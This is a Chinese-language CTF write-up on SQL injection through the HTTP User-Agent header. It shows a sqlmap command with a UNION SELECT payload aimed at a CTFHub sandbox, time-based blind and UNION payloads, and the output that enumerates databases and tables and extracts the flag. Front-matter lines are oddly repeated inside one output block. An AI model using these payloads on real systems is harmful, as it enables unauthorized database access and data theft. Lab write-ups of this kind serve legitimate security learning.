---
cover: https://w.wallhaven.cc/full/2e/wallhaven-2e75qx.jpg
created: 2024-11-27T22:18
date: 2024-11-23 23:07:37+00:00
lastmod: 2024-11-24 00:02:15+00:00
tag: web渗透
title: UA注入
updated: 2024-12-30T23:33
---



# UA注入

## 

UA是什么？UA也称User-Agent，当用户发起一个请求时，网站会通过判断 UA的数据，如（名称，版本，浏览器内核，内核版本）等等，来给不同的操作系统，不同的浏览器发送不同的页面

一般来说，普通的 SQL 注入是对 URL 及参数进行的，但这里攻击者却将 SQL 查询语句隐藏在了 HTTP 头部的User-Agent字段之中 ，也称UA注入

SQLMap 的 User-Agent (UA) 注入是一种利用应用程序在处理 HTTP User-Agent 头部时存在的 SQL 注入漏洞的技术。攻击者通过修改 User-Agent 头部中的数据来注入恶意 SQL 代码，从而获取数据库信息或执行其他恶意操作。

**如何利用 SQLMap 进行 UA 注入：**

SQLMap 本身并不直接支持“UA 注入”作为一种独立的注入类型。 它主要关注参数化的 SQL 注入。然而，如果一个应用程序的 User-Agent 头部被不安全地处理，导致其值被包含在 SQL 查询中，那么 SQLMap 可以用来测试和利用这个漏洞。 你需要告诉 SQLMap 将 User-Agent 头部作为测试参数。

步骤如下：

1. **识别潜在漏洞：**  首先，你需要确定目标应用程序是否存在 User-Agent 头部处理不当的漏洞。这通常需要进行手动测试或使用其他工具进行扫描。 例如，你可以尝试修改 User-Agent 头部，观察应用程序的响应是否发生变化，或者是否出现错误信息。
2. **使用 SQLMap 进行测试：**  一旦你确定存在潜在漏洞，可以使用 SQLMap 进行测试。 关键在于使用 `--user-agent`​ 参数指定 User-Agent 头部，并使用 `-p`​ 参数指定 User-Agent 作为测试参数。 由于 User-Agent 通常不是一个标准的请求参数，你可能需要一些额外的技巧。  
    例如：

    ```
    sqlmap -u "http://challenge-1cceef5ca6ef24ec.sandbox.ctfhub.com:10800/" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'+UNION+SELECT+1,2,3--" -p "User-Agent"
    ```

    在这个例子中：

    * ​`-u "http://target.com/page.php"`​ 指定目标 URL。
    * ​`--user-agent="..."`​ 设置 User-Agent 头部，其中包含一个简单的 UNION SELECT 测试语句。 你需要根据具体情况修改注入语句。
    * ​`-p "User-Agent"`​ 告诉 SQLMap 将 User-Agent 头部作为测试参数。
3. **分析结果：**  SQLMap 将尝试不同的注入技术，并根据结果判断是否存在漏洞。 如果 SQLMap 发现漏洞，它将提供有关数据库的信息，例如数据库类型、版本、用户等。

‍

```shell
---
Parameter: User-Agent (User-Agent)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.9) Gecko/20071103 Firefox/2.0.0.9 (Swiftfox) AND (SELECT 5455 FROM (SELECT(SLEEP(5)))vwyE)# uOgB

    Type: UNION query
    Title: Generic UNION query (random number) - 2 columns
    Payload: -3044 UNION ALL SELECT CONCAT(0x717a787671,0x436c6f7263544a7473717063674f6742757550596162746662686b566368784f6d79775567594974,0x7170707671),3573-- -
tags: [web渗透]
title: UA注入
title: UA注入
title: UA注入
tags: [web渗透]
title: UA注入
tags: [web渗透]
---
```

```shell
available databases [4]:                                                                                             
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli
```

```shell
Database: sqli                                                                                                       
[2 tables]
+------------+
| htlcwkgzgr |
| news       |
+------------+
```

```shell
Database: sqli
Table: htlcwkgzgr
[1 column]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| hhuhfrudir | varchar(100) |
+------------+--------------+
```

```shell
Database: sqli
Table: htlcwkgzgr
[1 entry]
+----------------------------------+
| hhuhfrudir                       |
+----------------------------------+
| ctfhub{0d92a40284dade61e614dd4d} |
+----------------------------------+
```

‍
